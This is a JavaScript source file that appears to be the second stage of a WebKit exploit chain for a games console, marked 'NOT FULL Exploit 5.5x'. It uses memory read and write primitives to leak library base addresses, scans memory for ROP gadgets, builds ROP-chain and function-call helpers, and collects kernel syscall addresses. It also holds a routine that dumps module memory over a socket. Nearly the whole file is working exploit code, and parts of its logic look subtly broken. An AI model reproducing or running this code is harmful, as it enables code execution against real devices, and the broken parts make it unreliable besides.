var log = function(x) {
    document.getElementById("console").innerText += x + "\n";
}
var print = function(string) { // like log but html
    document.getElementById("console").innerHTML += string + "\n";
}

var dumpModuleXHR = function(moduleBase) {
    var chunk = new ArrayBuffer(0x1000);
    var chunk32 = new Uint32Array(chunk);
    var chunk8 = new Uint8Array(chunk);
    
    connection.binaryType = "arraybuffer";
    var helo = new Uint32Array(1);
    helo[0] = 0x41414141;
    
    var moduleBase_ = moduleBase.add32(0);
    connection.onmessage = function() {
        try {
            for (var i = 0; i < chunk32.length; i++)
            {
                var val = p.read4(moduleBase_);
                chunk32[i] = val;
                moduleBase_.add32inplace(4);
            }
            connection.send(chunk8);
        } catch (e) {
            print(e);
        }
    }
}
var exploit = function() {
  p=window.primitives;
  
    print ("[+] exploit succeeded");
    print("webkit exploit result: " + p.leakval(0x41414141));
    print ("--- welcome to stage2 ---");
    
    p.leakfunc = function(func)
    {
        var fptr_store = p.leakval(func);
        return (p.read8(fptr_store.add32(0x18))).add32(0x40);
    }  
    var parseFloatStore = p.leakfunc(parseFloat);
    var parseFloatPtr = p.read8(parseFloatStore);
    print("parseFloat at: 0x" + parseFloatPtr);
    
    var webKitBase = p.read8(parseFloatStore);
    window.webKitBase = webKitBase;
    webKitBase.low &= 0xfffff000;
    webKitBase.sub32inplace(0x5b7000-0x1C000);
    
    window.moduleBaseWebKit = webKitBase;

    var offsetToWebKit = function(off) {
      return window.moduleBaseWebKit.add32(off)
    }    

    print("libwebkit base at: 0x" + webKitBase);
    var gadget = function(o)
    {
        return webKitBase.add32(o);
    }
          gadgets = {"stack_chk_fail":         gadget(0xc8),
    }; 
/*
    var libSceLibcInternalBase = p.read8(deref_stub_jmp(gadgets['stack_chk_fail']));
    libSceLibcInternalBase.low &= ~0x3FFF;
    libSceLibcInternalBase.sub32inplace(0x20000);
    print("libSceLibcInternal: 0x" + libSceLibcInternalBase.toString());
    window.libSceLibcInternalBase = libSceLibcInternalBase;
*/  
    var libKernelBase = p.read8(deref_stub_jmp(window.gadgets['stack_chk_fail']));
    window.libKernelBase = libKernelBase;
    libKernelBase.low &= 0xfffff000;
    libKernelBase.sub32inplace(0x12000);
    
    window.moduleBaseLibKernel = libKernelBase;

    var offsetToLibKernel = function(off) {
      return window.moduleBaseLibKernel.add32(off);
    }
    // Get libc module address
    var libSceLibcBase = p.read8(deref_stub_jmp(offsetToWebKit(0x228)));
    libSceLibcBase.low &= 0xfffff000;

    window.moduleBaseLibc = libSceLibcBase;
    
    var offsetToLibc = function(off) {
      return window.moduleBaseLibc.add32(off);
    }

    
    print("libkernel_web base at: 0x" + libKernelBase);
           
        var o2lk = function(o)
    {
        return libKernelBase.add32(o);
    }
    window.o2lk = o2lk;
    
    var wkview = new Uint8Array(0x1000);
    var wkstr = p.leakval(wkview).add32(0x10);
    var orig_wkview_buf = p.read8(wkstr);
    
    p.write8(wkstr, webKitBase);
    p.write4(wkstr.add32(8), 0x367c000);
    
    var gadgets_to_find = 0;
    var gadgetnames = [];
    for (var gadgetname in gadget) {
        if (gadget.hasOwnProperty(gadgetname)) {
            gadgets_to_find++;
            gadgetnames.push(gadgetname);
            gadget[gadgetname].reverse();
        }
    }
    log("finding gadgets");
    
    gadgets_to_find++; // gadget
    var findgadget = function(donecb) {
        if (gadget)
        {
            gadgets_to_find=0;
            gadget=0;
            log("using gadgets");
            
            for (var gadgetname in gadget) {
                if (gadgets.hasOwnProperty(gadgetname)) {
                    gadgets[gadgetname] = gadget(gadgets[gadgetname]);
                }
            }
            
        } else {
            for (var i=0; i < wkview.length; i++)
            {
                if (wkview[i] == 0xc3)
                {
                    for (var nl=0; nl < gadgetnames.length; nl++)
                    {
                        var found = 1;
                        if (!gadgetnames[nl]) continue;
                        var gadgetbytes = gadgets[gadgetnames[nl]];
                        for (var compareidx = 0; compareidx < gadgetbytes.length; compareidx++)
                        {
                            if (gadgetbytes[compareidx] != wkview[i - compareidx]){
                                found = 0;
                                break;
                            }
                        }
                        if (!found) continue;
                        gadgets[gadgetnames[nl]] = gadget(i - gadgetbytes.length + 1);
                        
                        delete gadgetnames[nl];
                        gadgets_to_find--;
                    }
                } else if (wkview[i] == 0xe0 && wkview[i-1] == 0xff && gadget)
                {
                    var found = 1;
                    for (var compareidx = 0;compareidx < gadget.length; compareidx++)
                    {
                        if (gadget[compareidx] != wkview[i - compareidx])
                        {
                            found = 0;
                            break;
                        }
                    }
                    if (!found) continue;
                    gadgets["jop"] = gadget(i - gadget.length + 1);
                    gadgetoffs["jop"] = i - gadget.length + 1;
                    gadgets_to_find--;
                    gadget = 0;
                }
                
                if (!gadgets_to_find) break;
            }
        }
        if (!gadgets_to_find && !gadget) {
            log("stage2 loaded gadgets");
            print("all good. gadgets test = Successful");
            if (gadgets)
                gadgets.open = function(e){
                    gadgets.send(JSON.stringify(gadget));
                }
                setTimeout(donecb, 50);
        } else {
            log("missing gadgets: ");
            for (var nl in gadgetnames) {
                log(" - " + gadgetnames[nl]);
            }
            if(gadget) log(" - jop gadget");
        }
    }

  // Setup ROP launching
    findgadget(function(){});
    var hold1;
    var hold2;
    var holdz;
    var holdz1;

    while (1) {
      hold1 = {a:0, b:0, c:0, d:0};
      hold2 = {a:0, b:0, c:0, d:0};
      holdz1 = p.leakval(hold2);
      holdz = p.leakval(hold1);
      if (holdz.low - 0x30 == holdz1.low) break;
    }

    var pushframe = [];
    pushframe.length = 0x80;
    var funcbuf;
    
  // Basic memory functions
  function malloc(size)
 {
  var backing = new Uint8Array(0x10000 + size);

  window.nogc.push(backing);

  var ptr     = p.read8(p.leakval(backing).add32(0x10));
  ptr.backing = backing;

  return ptr;
 }

  function mallocu32(size) {
  var backing = new Uint8Array(0x10000 + size * 4);

  window.nogc.push(backing);

  var ptr     = p.read8(p.leakval(backing).add32(0x10));
  ptr.backing = new Uint32Array(backing.buffer);

  return ptr;
} 
    
  function stringify(str)
 {
  var bufView = new Uint8Array(str.length + 1);

  for(var i=0; i < str.length; i++) {
      bufView[i] = str.charCodeAt(i) & 0xFF;
  }

  window.nogc.push(bufView);
  return p.read8(p.leakval(bufView).add32(0x10));
}  

  var krop = function (p, addr) {
  // Contains base and stack pointer for fake stack (this.stackBase = RBP, this.stackPointer = RSP)
  this.stackBase    = addr;
  this.stackPointer = 0;

  // Push instruction / value onto fake stack
  this.push = function (val) {
    p.write8(this.stackBase.add32(this.stackPointer), val);
    this.stackPointer += 8;
  };
   
    // Write to address with value (helper function)
    this.write64 = function (addr, val) {
    this.push(window.gadgets["pop rdi"]);
    this.push(addr);
    this.push(window.gadgets["pop rax"]);
    this.push(val);
    this.push(window.gadgets["mov [rdi], rax"]);
  }
   
  // Return krop object
  return this;
};

    window.Rop = function () {
        this.stack = new Uint32Array(0x10000);
        this.stackPointer = p.read8(p.leakval(this.stack).add32(0x10));
        this.count = 0;
        
        this.clear = function() {
            this.count = 0;
            this.runtime = undefined;
            
            for (var i = 0; i < 0x1000/8; i++)
            {
                p.write8(this.stackBase.add32(i*8), 0);
            }
        };
        
        this.pushSymbolic = function() {
            this.count++;
            return this.count-1;
        }
        
        this.finalizeSymbolic = function(idx, val) {
            p.write8(this.stackBase.add32(idx*8), val);
        }
        
        this.push = function(val) {
            this.finalizeSymbolic(this.pushSymbolic(), val);
        }
         this.push_write8 = function(where, what)
  {
      this.push(gadgets["pop rdi"]); // pop rdi
      this.push(where); // where
      this.push(gadgets["pop rsi"]); // pop rsi
      this.push(what); // what
      this.push(gadgets["mov [rdi], rsi"]); // perform write
  }
       this.fcall = function (rip, rdi, rsi, rdx, rcx, r8, r9)
  {
    if (rdi != undefined) {
      this.push(gadgets["pop rdi"]); // pop rdi
      this.push(rdi); // what
    }
    if (rsi != undefined) {
      this.push(gadgets["pop rsi"]); // pop rsi
      this.push(rsi); // what
    }
    if (rdx != undefined) {
      this.push(gadgets["pop rdx"]); // pop rdx
      this.push(rdx); // what
    }
    if (rcx != undefined) {
      this.push(gadgets["pop rcx"]); // pop r10
      this.push(rcx); // what
    }
    if (r8 != undefined) {
      this.push(gadgets["pop r8"]); // pop r8
      this.push(r8); // what
    }
    if (r9 != undefined) {
      this.push(gadgets["pop r9"]); // pop r9
      this.push(r9); // what*/
    }

    this.push(rip); // jmp
    return this;
  }
        
      this.run = function() {
      var retv = p.loadchain(this, this.notimes);
      this.clear();
      return retv;
  }
  
  return this;
};
    var RopChain = window.Rop();
 
    log("--- welcome to all stage ---");   

    var kview = new Uint8Array(0x1000);
    var kstr = p.leakval(kview).add32(0x10);
    var orig_kview_buf = p.read8(kstr);
    
    p.write8(kstr, window.libKernelBase);
    p.write4(kstr.add32(8), 0x40000); // high enough lel
    
    var countbytes;
    for (var i=0; i < 0x40000; i++)
    {
        if (kview[i] == 0x72 && kview[i+1] == 0x64 && kview[i+2] == 0x6c && kview[i+3] == 0x6f && kview[i+4] == 0x63)
        {
            countbytes = i;
            break;
        }
    }    

    p.write4(kstr.add32(8), countbytes + 32);
    
    var dview32 = new Uint32Array(1);
    var dview8 = new Uint8Array(dview32.buffer);
    for (var i=0; i < countbytes; i++)
    {
        if (kview[i] == 0x48 && kview[i+1] == 0xc7 && kview[i+2] == 0xc0 && kview[i+7] == 0x49 && kview[i+8] == 0x89 && kview[i+9] == 0xca && kview[i+10] == 0x0f && kview[i+11] == 0x05)
        {
            dview8[0] = kview[i+3];
            dview8[1] = kview[i+4];
            dview8[2] = kview[i+5];
            dview8[3] = kview[i+6];
            var syscallno = dview32[0];
            window.syscalls[syscallno] = window.libKernelBase.add32(i);
        }
    }
 
    log("stage3 loaded syscalls");
    print("all good. fcall test = Successful");  
    print("all stages test");
    print("NOT FULL Exploit 5.5x");
    
    /*sc = document.createElement("script");
    sc.src="kernel.js";
    document.body.appendChild(sc);}, 100);*/
}

